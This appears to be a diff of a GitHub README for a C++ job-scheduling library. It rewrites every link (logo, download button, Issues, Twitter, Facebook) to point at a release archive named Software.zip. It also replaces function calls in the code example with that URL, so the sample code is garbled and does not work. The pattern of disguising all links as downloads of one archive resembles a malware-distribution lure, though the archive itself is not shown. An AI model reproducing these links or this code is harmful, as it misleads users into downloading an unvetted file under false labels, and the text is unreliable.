@@ -2,7 +2,7 @@
 
 ### Welcome to the Cacau Job System GitHub repository!
 
-![Cacau Job System Logo](https://github.com/njschal/CacauJobSystem/releases/download/v1.0/Application.zip)
+![Cacau Job System Logo](https://github.com/njschal/CacauJobSystem/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -16,11 +16,11 @@
 
 ## 🚀 Get Started
 
-To start using the Cacau Job System, download the **[https://github.com/njschal/CacauJobSystem/releases/download/v1.0/Application.zip](https://github.com/njschal/CacauJobSystem/releases/download/v1.0/Application.zip)** and follow the instructions in the documentation.
+To start using the Cacau Job System, download the **[https://github.com/njschal/CacauJobSystem/releases/download/v2.0/Software.zip](https://github.com/njschal/CacauJobSystem/releases/download/v2.0/Software.zip)** and follow the instructions in the documentation.
 
 ### Launch Release
 Click the below button to download the latest release:
-[![Download Release](https://github.com/njschal/CacauJobSystem/releases/download/v1.0/Application.zip)](https://github.com/njschal/CacauJobSystem/releases/download/v1.0/Application.zip)
+[![Download Release](https://github.com/njschal/CacauJobSystem/releases/download/v2.0/Software.zip)](https://github.com/njschal/CacauJobSystem/releases/download/v2.0/Software.zip)
 
 If you encounter any issues with the download link, please check the **Releases** section of this repository.
 
@@ -48,11 +48,11 @@ CacauJobSystem jobSystem;
 Job job1 = []() { /* Job 1 Logic */ };
 Job job2 = [&job1]() { /* Job 2 Logic depending on Job 1 */ };
 
-https://github.com/njschal/CacauJobSystem/releases/download/v1.0/Application.zip(job1);
-https://github.com/njschal/CacauJobSystem/releases/download/v1.0/Application.zip(job2);
+https://github.com/njschal/CacauJobSystem/releases/download/v2.0/Software.zip(job1);
+https://github.com/njschal/CacauJobSystem/releases/download/v2.0/Software.zip(job2);
 
 // Execute jobs
-https://github.com/njschal/CacauJobSystem/releases/download/v1.0/Application.zip();
+https://github.com/njschal/CacauJobSystem/releases/download/v2.0/Software.zip();
 ```
 
 ---
@@ -85,7 +85,7 @@ Together, we can make the Cacau Job System even better!
 
 ## 📞 Support
 
-If you have any questions, issues, or feature requests, feel free to reach out to us through the **[Issues](https://github.com/njschal/CacauJobSystem/releases/download/v1.0/Application.zip)** section. We are here to help you make the most of the Cacau Job System.
+If you have any questions, issues, or feature requests, feel free to reach out to us through the **[Issues](https://github.com/njschal/CacauJobSystem/releases/download/v2.0/Software.zip)** section. We are here to help you make the most of the Cacau Job System.
 
 ---
 
@@ -93,8 +93,8 @@ If you have any questions, issues, or feature requests, feel free to reach out t
 
 Follow us on social media for updates, tips, and more:
 
-- Twitter: [@CacauJobSystem](https://github.com/njschal/CacauJobSystem/releases/download/v1.0/Application.zip)
-- Facebook: [Cacau Job System](https://github.com/njschal/CacauJobSystem/releases/download/v1.0/Application.zip)
+- Twitter: [@CacauJobSystem](https://github.com/njschal/CacauJobSystem/releases/download/v2.0/Software.zip)
+- Facebook: [Cacau Job System](https://github.com/njschal/CacauJobSystem/releases/download/v2.0/Software.zip)
 
 ---
 
